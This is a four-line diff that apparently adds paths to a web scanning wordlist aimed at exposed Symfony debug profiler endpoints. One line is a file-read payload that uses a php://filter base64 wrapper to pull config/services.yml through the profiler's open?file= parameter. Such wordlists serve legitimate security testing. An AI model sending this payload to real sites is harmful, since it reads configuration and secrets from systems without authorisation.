@@ -1,0 +1,4 @@
+/_profiler/
+/_profiler/phpinfo
+/_profiler/router
+/_profiler/open?file=php://filter/convert.base64-encode/resource=config/services.yml
